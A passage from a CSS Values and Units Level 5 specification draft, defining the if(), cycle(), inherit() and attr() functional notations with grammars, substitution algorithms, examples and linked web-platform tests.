production](#free-form-productions) restrictions (alongside commas and curly braces).

To [[replace an if()
function](#replace-an-arbitrary-substitution-function)], given a list of `arguments`:

1. [For
 each](https://infra.spec.whatwg.org/#list-iterate)
 [\<if-args-branch\>](#typedef-if-args-branch) `branch` in
 `arguments`:

 1. [Substitute arbitrary substitution
 functions](#substitute-arbitrary-substitution-function) in the first
 [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) of `branch`, then
 [parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) the result as an
 [\<if-condition\>](#typedef-if-condition). If parsing returns failure,
 [continue](https://infra.spec.whatwg.org/#iteration-continue); otherwise, let the result be
 `condition`.

 2. Evaluate `condition`.

 If a
 [\<style-query\>](https://drafts.csswg.org/css-conditional-5/#typedef-style-query) in `condition`
 tests the value of a property, and
 [guarding](#guarded) a
 [substitution
 context](#substitution-context) «\"property\", referenced-property-name» would
 mark it as a [cyclic substitution
 context](#cyclic-substitution-contexts), that query evaluates to false.

 :::
 (#example-34dea991) For example, in [\--foo:
 if(style(\--foo: bar): baz);] the
 [style()] query is automatically false, since [property
 replacement](#property-replacement) has already established a «\"property\",
 \"\--foo\"» [substitution
 context](#substitution-context).
 :::

 If the result of `condition` is false,
 [continue](https://infra.spec.whatwg.org/#iteration-continue).

 3. [Substitute arbitrary substitution
 functions](#substitute-arbitrary-substitution-function) in the second
 [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) of `branch`, and
 return the result.

2. Return nothing (an empty sequence of [component
 values](https://drafts.csswg.org/css-syntax-3/#component-value)).

 Unlike using
[\@media](https://drafts.csswg.org/css-conditional-3/#at-ruledef-media)/[\@supports](https://drafts.csswg.org/css-conditional-3/#at-ruledef-supports)/[\@container](https://drafts.csswg.org/css-conditional-5/#at-ruledef-container) rules, which just ignore their contents when
they're false and let the cascade determine what values otherwise apply,
declarations with [if()](#funcdef-if) do not roll back the cascade if the conditions are
false; any fallback values must be provided inline. However, see the
[revert-rule](https://drafts.csswg.org/css-cascade-5/#valdef-all-revert-rule) [CSS-wide
keyword](https://drafts.csswg.org/css-values-4/#css-wide-keywords).

### 8.4. Toggling Between Values: the [cycle() notation]
The [cycle()] expression allows descendant elements to cycle over a list of
values instead of inheriting the same value.

The following example makes
`<em>` elements italic in general, but makes them normal if
they're inside something that's italic:

``` highlight
em { font-style: cycle(italic, normal); }
```

The following example cycles markers
for nested lists, so that a top level list has
[disc](https://drafts.csswg.org/css2/#value-def-disc)-shaped markers, but nested lists use
[circle](https://drafts.csswg.org/css2/#value-def-circle), then
[square](https://drafts.csswg.org/css2/#value-def-square), then [box], and then repeat through the
list of marker shapes, starting again (for the 5th list deep) with
[disc].

``` highlight
ul { list-style-type: cycle(disc, circle, square, box); }
```

The syntax of the [cycle()](#funcdef-cycle) expression is:

```
<cycle()> = cycle( <whole-value># )
```

The [cycle()](#funcdef-cycle) notation is a
[\<whole-value\>](#whole-value). However, it is not allowed to be nested, nor may it
contain [attr()](#funcdef-attr) or
[calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) notations; declarations containing such
constructs are invalid.

The following
[cycle()](#funcdef-cycle) examples are all invalid:

``` highlight
background-position: 10px cycle(50px, 100px);
/* cycle() must be the sole value of the property */

list-style-type: cycle(disc, 50px);
/* ''50px'' isn't a valid value of 'list-style-type' */
```

To determine the computed value of
[cycle()](#funcdef-cycle), first evaluate each argument as if it were the sole
value of the property in which [cycle()]
is placed to determine the computed value that each represents, called
`C`~`n`~ for the `n`-th argument to
[cycle()]. Then, compare the property's
[inherited
value](https://drafts.csswg.org/css-cascade-5/#inherited-value) with each `C`~`n`~. For the
earliest `C`~`n`~ that matches the [inherited
value], the computed value of
[cycle()] is
`C`~`n+1`~. If the match was the last argument in
the list, or there was no match, the computed value of
[cycle()] is the computed value that the
first argument represents.

 This means that repeating values in a
[cycle()](#funcdef-cycle) short-circuits the list. For example [cycle(1em, 2em,
1em, 4em)] will be equivalent to [cycle(1em, 2em)].

 That [cycle()](#funcdef-cycle) explicitly looks at the computed value of the
parent, so it works even on non-inherited properties. This is similar to
the
[inherit](https://drafts.csswg.org/css-cascade-5/#valdef-all-inherit) keyword, which works even on non-inherited
properties.

 The [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) of a property is an abstract set of values, not a
particular serialization
[\[CSS21\]](#biblio-css21 "Cascading Style Sheets Level 2 Revision 1 (CSS 2.1) Specification"),
so comparison between computed values should always be unambiguous and
have the expected result. For example, a Level 2
[background-position](https://drafts.csswg.org/css2/#propdef-background-position) computed value is just two offsets,
each represented as an absolute length or a percentage, so the
declarations [background-position: top
center](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position) and [background-position: 50%
0%] produce identical
computed values. If the \"Computed Value\" line of a property definition
seems to define something ambiguous or overly strict, please [provide
feedback](#sotd) so we can fix it.

If [cycle()](#funcdef-cycle) is used on a [shorthand
property](https://drafts.csswg.org/css-cascade-5/#shorthand-property), it sets each of its longhands to a
[cycle()] value with arguments
corresponding to what the longhand would have received had each of the
original [cycle()] arguments been the
sole value of the [shorthand].

For example, the following shorthand
declaration:

``` highlight
margin: cycle(1px 2px, 4px, 1px 5px 4px);
```

is equivalent to the following longhand declarations:

``` highlight
margin-top: cycle(1px, 4px, 1px);
margin-right: cycle(2px, 4px, 5px);
margin-bottom: cycle(1px, 4px, 4px);
margin-left: cycle(2px, 4px, 5px);
```

Note that, since [1px] appears twice in the top margin and
[4px] appears twice in bottom margin, they will cycle between only
two values while the left and right margins cycle through three. In
other words, the declarations above will yield the same computed values
as the longhand declarations below:

``` highlight
margin-top: cycle(1px, 4px);
margin-right: cycle(2px, 4px, 5px);
margin-bottom: cycle(1px, 4px);
margin-left: cycle(2px, 4px, 5px);
```

which may not be what was intended.

### [8.5. ][ Custom Property References: the [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) notation]
The
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) notation substitutes the value of a [custom
property](https://drafts.csswg.org/css-variables-2/#custom-property), see the [CSS Custom Properties for Cascading Variables
Module](https://www.w3.org/TR/css-variables/#using-variables).
[\[CSS-VARIABLES\]](#biblio-css-variables "CSS Custom Properties for Cascading Variables Module Level 1")

### 8.6. Inherited Value References: the [inherit() notation]
Tests

- [inherit-function-basic.html](https://wpt.fyi/results/css/css-values/inherit-function-basic.html "css/css-values/inherit-function-basic.html")
 [[(live
 test)]](http://wpt.live/css/css-values/inherit-function-basic.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/inherit-function-basic.html)
- [inherit-function-invalidation.html](https://wpt.fyi/results/css/css-values/inherit-function-invalidation.html "css/css-values/inherit-function-invalidation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/inherit-function-invalidation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/inherit-function-invalidation.html)
- [inherit-function-parsing.html](https://wpt.fyi/results/css/css-values/inherit-function-parsing.html "css/css-values/inherit-function-parsing.html")
 [[(live
 test)]](http://wpt.live/css/css-values/inherit-function-parsing.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/inherit-function-parsing.html)

Like the
[inherit](https://drafts.csswg.org/css-cascade-5/#valdef-all-inherit) keyword, the [inherit()] [functional
notation](https://drafts.csswg.org/css-values-4/#functional-notation) resolves to the [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) of a property on the parent. Rather than resolving to
the value of the same property, however, it resolves to a sequence of
[component
values](https://drafts.csswg.org/css-syntax-3/#component-value) representing the [computed
value] of the property specified as its first
argument. Its second argument, if present, is used as a fallback in case
the first argument resolves to the [guaranteed-invalid
value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

[inherit()](#funcdef-inherit) is an [arbitrary substitution
function](#arbitrary-substitution-function) whose syntax is defined as:

```
<inherit()> = inherit( <custom-property-name>, <declaration-value>? )
```

The [inherit()](#funcdef-inherit) function's [argument
grammar](#argument-grammar)
is:

```
<inherit-args> = inherit( <declaration-value>, <declaration-value>? )
```

Like
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var), a bare comma can be used with nothing following
it, indicating that the second
[\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) was passed, just as an empty
sequence.

 That is, [inherit(\--foo)] does not pass a
fallback value, but [inherit(\--foo,)] does (the fallback is just
empty).

To [[replace an inherit()
function](#replace-an-arbitrary-substitution-function)], given a list of `arguments`:

1. [Substitute arbitrary substitution
 functions](#substitute-arbitrary-substitution-function) in the first
 [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) of `arguments`, then
 [parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) it as a
 [\<custom-property-name\>](https://drafts.csswg.org/css-variables-2/#typedef-custom-property-name).

2. If parsing returned a
 [\<custom-property-name\>](https://drafts.csswg.org/css-variables-2/#typedef-custom-property-name), and the [inherited
 value](https://drafts.csswg.org/css-cascade-5/#inherited-value) of that [custom
 property](https://drafts.csswg.org/css-variables-2/#custom-property) on the element does not contain the
 [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), return that inherited value.

3. Otherwise, if a second
 [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value)? was passed in
 `arguments`, [substitute arbitrary substitution
 functions](#substitute-arbitrary-substitution-function) in that argument, and return the result.

4. Otherwise, return the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

 Future levels of CSS may allow specifying standard CSS
properties in [inherit()](#funcdef-inherit); however because the tokenization of [computed
values](https://drafts.csswg.org/css-cascade-5/#computed-value) is not fully standardized for all CSS properties, this
feature is deferred from Level 5. Note that the [computed
value] differs from the [used
value](https://drafts.csswg.org/css-cascade-5/#used-value), and is not always the resolved value returned by
[`getComputedStyle()`](https://drafts.csswg.org/cssom-1/#dom-window-getcomputedstyle); thus even if [inherit(width)] were allowed, it
would frequently return the keyword
[auto](https://drafts.csswg.org/css-sizing-3/#valdef-width-auto), not the used
[\<length\>](https://drafts.csswg.org/css-values-4/#length-value).

### 8.7. Attribute References: the [attr() notation]
The [attr()] function substitutes the value of an
[attribute](https://dom.spec.whatwg.org/#concept-attribute) on an
[element](https://dom.spec.whatwg.org/#concept-element) into a property, similar to how the
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) function substitutes a [custom
property](https://drafts.csswg.org/css-variables-2/#custom-property) value into a function.

```
attr() = attr( <attr-name> <attr-type>? , <declaration-value>?)

<attr-name> = [ <ident-token>? '|' ]? <ident-token>
<attr-type> = type( <syntax> ) | raw-string | number | <attr-unit>
<attr-unit> = <custom-ident>
```

The [attr()](#funcdef-attr) function's [argument
grammar](#argument-grammar)
is:

```
<attr-args> = attr( <declaration-value>, <declaration-value>? )
```

Tests

- [attr-IACVT.html](https://wpt.fyi/results/css/css-values/attr-IACVT.html "css/css-values/attr-IACVT.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-IACVT.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-IACVT.html)
- [attr-all-types.html](https://wpt.fyi/results/css/css-values/attr-all-types.html "css/css-values/attr-all-types.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-all-types.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-all-types.html)
- [attr-argument-grammar.html](https://wpt.fyi/results/css/css-values/attr-argument-grammar.html "css/css-values/attr-argument-grammar.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-argument-grammar.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-argument-grammar.html)
- [attr-color-invalid-cast.html](https://wpt.fyi/results/css/css-values/attr-color-invalid-cast.html "css/css-values/attr-color-invalid-cast.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-color-invalid-cast.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-color-invalid-cast.html)
- [attr-color-valid.html](https://wpt.fyi/results/css/css-values/attr-color-valid.html "css/css-values/attr-color-valid.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-color-valid.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-color-valid.html)
- [attr-container-style-query.html](https://wpt.fyi/results/css/css-values/attr-container-style-query.html "css/css-values/attr-container-style-query.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-container-style-query.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-container-style-query.html)
- [attr-crash.html](https://wpt.fyi/results/css/css-values/attr-crash.html "css/css-values/attr-crash.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-crash.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-crash.html)
- [attr-css-wide-keywords.html](https://wpt.fyi/results/css/css-values/attr-css-wide-keywords.html "css/css-values/attr-css-wide-keywords.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-css-wide-keywords.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-css-wide-keywords.html)
- [attr-cycle.html](https://wpt.fyi/results/css/css-values/attr-cycle.html "css/css-values/attr-cycle.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-cycle.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-cycle.html)
- [attr-dynamic-marker-content.html](https://wpt.fyi/results/css/css-values/attr-dynamic-marker-content.html "css/css-values/attr-dynamic-marker-content.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-dynamic-marker-content.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-dynamic-marker-content.html)
- [attr-in-max.html](https://wpt.fyi/results/css/css-values/attr-in-max.html "css/css-values/attr-in-max.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-in-max.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-in-max.html)
- [attr-in-slotted.html](https://wpt.fyi/results/css/css-values/attr-in-slotted.html "css/css-values/attr-in-slotted.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-in-slotted.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-in-slotted.html)
- [attr-invalidation.html](https://wpt.fyi/results/css/css-values/attr-invalidation.html "css/css-values/attr-invalidation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-invalidation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-invalidation.html)
- [attr-length-invalid-cast.html](https://wpt.fyi/results/css/css-values/attr-length-invalid-cast.html "css/css-values/attr-length-invalid-cast.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-length-invalid-cast.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-length-invalid-cast.html)
- [attr-length-specified.html](https://wpt.fyi/results/css/css-values/attr-length-specified.html "css/css-values/attr-length-specified.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-length-specified.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-length-specified.html)
- [attr-length-valid-zero-nofallback.html](https://wpt.fyi/results/css/css-values/attr-length-valid-zero-nofallback.html "css/css-values/attr-length-valid-zero-nofallback.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-length-valid-zero-nofallback.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-length-valid-zero-nofallback.html)
- [attr-length-valid-zero.html](https://wpt.fyi/results/css/css-values/attr-length-valid-zero.html "css/css-values/attr-length-valid-zero.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-length-valid-zero.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-length-valid-zero.html)
- [attr-length-valid.html](https://wpt.fyi/results/css/css-values/attr-length-valid.html "css/css-values/attr-length-valid.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-length-valid.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-length-valid.html)
- [attr-namespace-case-sensitivity.xhtml](https://wpt.fyi/results/css/css-values/attr-namespace-case-sensitivity.xhtml "css/css-values/attr-namespace-case-sensitivity.xhtml")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-namespace-case-sensitivity.xhtml)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-namespace-case-sensitivity.xhtml)
- [attr-namespace-non-existing.html](https://wpt.fyi/results/css/css-values/attr-namespace-non-existing.html "css/css-values/attr-namespace-non-existing.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-namespace-non-existing.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-namespace-non-existing.html)
- [attr-namespace-valid.xhtml](https://wpt.fyi/results/css/css-values/attr-namespace-valid.xhtml "css/css-values/attr-namespace-valid.xhtml")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-namespace-valid.xhtml)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-namespace-valid.xhtml)
- [attr-namespace-wildcard.html](https://wpt.fyi/results/css/css-values/attr-namespace-wildcard.html "css/css-values/attr-namespace-wildcard.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-namespace-wildcard.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-namespace-wildcard.html)
- [attr-notype-fallback.html](https://wpt.fyi/results/css/css-values/attr-notype-fallback.html "css/css-values/attr-notype-fallback.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-notype-fallback.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-notype-fallback.html)
- [attr-null-namespace.xhtml](https://wpt.fyi/results/css/css-values/attr-null-namespace.xhtml "css/css-values/attr-null-namespace.xhtml")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-null-namespace.xhtml)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-null-namespace.xhtml)
- [attr-pseudo-elem-invalidation-2.html](https://wpt.fyi/results/css/css-values/attr-pseudo-elem-invalidation-2.html "css/css-values/attr-pseudo-elem-invalidation-2.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-pseudo-elem-invalidation-2.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-pseudo-elem-invalidation-2.html)
- [attr-pseudo-elem-invalidation.html](https://wpt.fyi/results/css/css-values/attr-pseudo-elem-invalidation.html "css/css-values/attr-pseudo-elem-invalidation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-pseudo-elem-invalidation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-pseudo-elem-invalidation.html)
- [attr-pseudo-element-marker.html](https://wpt.fyi/results/css/css-values/attr-pseudo-element-marker.html "css/css-values/attr-pseudo-element-marker.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-pseudo-element-marker.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-pseudo-element-marker.html)
- [attr-pseudo-element-originating.html](https://wpt.fyi/results/css/css-values/attr-pseudo-element-originating.html "css/css-values/attr-pseudo-element-originating.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-pseudo-element-originating.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-pseudo-element-originating.html)
- [attr-pseudo-element-placeholder.html](https://wpt.fyi/results/css/css-values/attr-pseudo-element-placeholder.html "css/css-values/attr-pseudo-element-placeholder.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-pseudo-element-placeholder.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-pseudo-element-placeholder.html)
- [attr-revert-rule.html](https://wpt.fyi/results/css/css-values/attr-revert-rule.html "css/css-values/attr-revert-rule.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-revert-rule.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-revert-rule.html)
- [attr-serialization.html](https://wpt.fyi/results/css/css-values/attr-serialization.html "css/css-values/attr-serialization.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-serialization.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-serialization.html)
- [attr-style-sharing-1.html](https://wpt.fyi/results/css/css-values/attr-style-sharing-1.html "css/css-values/attr-style-sharing-1.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-style-sharing-1.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-style-sharing-1.html)
- [attr-style-sharing-2.html](https://wpt.fyi/results/css/css-values/attr-style-sharing-2.html "css/css-values/attr-style-sharing-2.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-style-sharing-2.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-style-sharing-2.html)
- [attr-style-sharing-3.html](https://wpt.fyi/results/css/css-values/attr-style-sharing-3.html "css/css-values/attr-style-sharing-3.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-style-sharing-3.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-style-sharing-3.html)
- [attr-style-sharing-4.html](https://wpt.fyi/results/css/css-values/attr-style-sharing-4.html "css/css-values/attr-style-sharing-4.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-style-sharing-4.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-style-sharing-4.html)
- [attr-style-sharing-5.html](https://wpt.fyi/results/css/css-values/attr-style-sharing-5.html "css/css-values/attr-style-sharing-5.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-style-sharing-5.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-style-sharing-5.html)
- [attr-universal-selector.html](https://wpt.fyi/results/css/css-values/attr-universal-selector.html "css/css-values/attr-universal-selector.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-universal-selector.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-universal-selector.html)
- [html-attr-case-insensitivity.html](https://wpt.fyi/results/css/css-values/html-attr-case-insensitivity.html "css/css-values/html-attr-case-insensitivity.html")
 [[(live
 test)]](http://wpt.live/css/css-values/html-attr-case-insensitivity.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/html-attr-case-insensitivity.html)

Like
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var), a bare comma can be used with nothing following
it, indicating that the second
[\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) was passed, just as an empty
sequence.

 That is, [attr(foo)] does not pass a fallback
value, but [attr(foo,)] does (the fallback is just empty).

[\<attr-unit\>](#typedef-attr-unit) is intended to represents an
[identifier](https://drafts.csswg.org/css-values-4/#css-css-identifier) that is an [ASCII
case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for the name of a CSS dimension unit, such as
[px](https://drafts.csswg.org/css-values-4/#px), or the
[\<delim-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-delim-token) [%]. As this set expands
regularly, it is actually specified as a
[\<custom-ident\>](https://drafts.csswg.org/css-values-4/#identifier-value), and triggers fallback behavior when
it doesn't match a known unit (rather than making the function invalid).

The arguments of [attr()](#funcdef-attr) are:

[\<attr-name\>](#typedef-attr-name)

: Gives the name of the attribute being referenced, similar to
 [\<wq-name\>] (from
 [\[SELECTORS-3\]](#biblio-selectors-3 "Selectors Level 3"))
 but without the possibility of a wildcard prefix.

 If no namespace is specified (just an identifier is given, like
 [attr(foo)]), the null namespace is implied. (This is usually
 what's desired, as namespaced attributes are rare. In particular,
 HTML and SVG do not contain namespaced attributes.) Unless otherwise
 specified, the case-sensitivity/matching rules of
 [\<attr-name\>](#typedef-attr-name) are identical to [attribute
 selectors](https://drafts.csswg.org/selectors-4/#attribute-selector) (and thus might depend on the host language).

 Whitespace is not allowed between any of the components of
 [\<attr-name\>](#typedef-attr-name).

 If [attr()](#funcdef-attr) is used in a property applied to an element, it
 references the attribute of the given name on that element; if
 applied to a
 [pseudo-element](https://drafts.csswg.org/selectors-4/#pseudo-element), the attribute is looked up on the pseudo-element's
 [originating
 element](https://drafts.csswg.org/selectors-4/#originating-element).

[\<attr-type\>](#typedef-attr-type)

: Specifies how the attribute value is
 [parsed](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) into a CSS value.

 If given as a
 [type()](#funcdef-attr-type) function, the value is parsed according to the
 [\<syntax\>](#typedef-syntax) argument, and substitutes as the
 resulting tokens. For this purpose, [\<url\>] is invalid as a
 [\<syntax-single-component\>](#typedef-syntax-single-component). Values that fail to parse
 according to the syntax trigger fallback.

 [\<url\>] is banned because, for now,
 [attr()](#funcdef-attr) values can't be used in URLs at all due to
 security concerns.

 If given as the [number] keyword, it causes the attribute's
 literal value, after [stripping leading and trailing
 whitespace](https://infra.spec.whatwg.org/#strip-leading-and-trailing-ascii-whitespace), to be
 [parsed](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) as a
 [\<number-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-number-token). Values that fail to parse
 trigger fallback.

 If given as an
 [\<attr-unit\>](#typedef-attr-unit) value, the value is first parsed as if
 [number] keyword was specified; if this fails to parse, it
 triggers fallback. Then, if the
 [\<attr-unit\>] value
 matches a known CSS unit name or is [%], the number is turned
 into a dimension or percentage with that value and the given unit.
 If the [\<attr-unit\>] does
 not match a known CSS unit, it triggers fallback.

 If given as the [raw-string] keyword, or omitted entirely, it
 causes the attribute's literal value to be treated as the value of a
 CSS string, with no CSS parsing performed at all (including CSS
 escapes, whitespace removal, comments, etc). No value triggers
 fallback; only the lack of the attribute entirely does.

 This is different from specifying a syntax of
 [type(\*)], which still triggers CSS parsing (but with no
 requirements placed on it beyond that it parse validly), and which
 substitutes the result of that parsing directly as tokens, rather
 than as a
 [\<string\>](https://drafts.csswg.org/css-values-4/#string-value) value.

[\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value)

: Specifies a fallback value for the
 [attr()](#funcdef-attr), which will be substituted instead of the
 attribute's value if the attribute is missing or fails to parse as
 the specified type.

 If the
 [\<attr-type\>](#typedef-attr-type) argument is omitted, the fallback
 defaults to the empty string if omitted; otherwise, it defaults to
 the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value) if omitted.

If a property contains one or more
[attr()](#funcdef-attr)
functions, and those functions are syntactically valid, the entire
property's grammar must be assumed to be valid at parse time. It is only
syntax-checked at computed-value time, after
[attr()] functions have been
[substituted](#substitute-arbitrary-substitution-function).

Note that the default value need not be of the type given. For instance,
if the type required of the attribute by the author is
[\<length\>], the default could still be [auto], like in
[width: attr(size \<length\>,
auto);](https://drafts.csswg.org/css-sizing-3/#propdef-width).

This example shows the use of attr()
to visually illustrate data in an XML file:

``` highlight
<stock>
 <wood length="12"/>
 <wood length="5"/>
 <metal length="19"/>
 <wood length="4"/>
</stock>

stock::before {
 display: block;
 content: "To scale, the lengths of materials in stock are:";
}
stock > * {
 display: block;
 width: attr(length em, 0px);
 height: 1em;
 border: solid thin;
 margin: 0.5em;
}
wood {
 background: orange url(wood.png);
}
metal {
 background: silver url(metal.png);
}
```

#### 8.7.1. Substitution

[attr()](#funcdef-attr)
is an [arbitrary substitution
function](#arbitrary-substitution-function), similar to
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var), and so is replaced with the value it represents
(if possible) at [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) time; otherwise, it's replaced with the
[guaranteed-invalid
value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), which will make its declaration [invalid at
computed-value
time](#invalid-at-computed-value-time).

To [[replace an attr()
function](#replace-an-arbitrary-substitution-function)], given a list of `arguments`:

1. Let `el` be the element that the style containing the
 [attr()](#funcdef-attr) function is being applied to. Let
 `first arg` be the first
 [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) in `arguments`. Let
 `second arg` be the
 [\<declaration-value\>]? passed after the comma, or null if there was no comma.

2. [Substitute arbitrary substitution
 functions](#substitute-arbitrary-substitution-function) in `first arg`, then
 [parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) it as
 [[\<attr-name\>](#typedef-attr-name)
 [\<attr-type\>](#typedef-attr-type)?]. If that returns failure, jump
 to the last step (labeled FAILURE). Otherwise, let
 `attr name` and `syntax` be the results of
 parsing (with `syntax` being null if
 [\<attr-type\>](#typedef-attr-type) was omitted), processed as specified
 in the definition of those arguments.

3. If `attr name` exists as an attribute on `el`,
 let `attr value` be its value; otherwise jump to the last
 step (labeled FAILURE).

4. If `syntax` is the keyword [number] or an
 [\<attr-unit\>](#typedef-attr-unit) value, parse `attr value`
 against
 [\<attr-type\>](#typedef-attr-type). If that succeeds, return the result;
 otherwise, jump to the last step (labeled FAILURE).

 No parsing or modification of any kind is performed
 on the value.

5. If `syntax` is null or the keyword [raw-string],
 return a CSS
 [\<string\>](https://drafts.csswg.org/css-values-4/#string-value) whose value is
 `attr value`.

 No parsing or modification of any kind is performed
 on the value.

6. [Substitute arbitrary substitution
 functions](#substitute-arbitrary-substitution-function) in `attr value`, with «\"attribute\",
 `attr name`» as the [substitution
 context](#substitution-context), then [parse with a
 \<syntax\>](#parse-with-a-syntax) `attr value`, with `syntax`
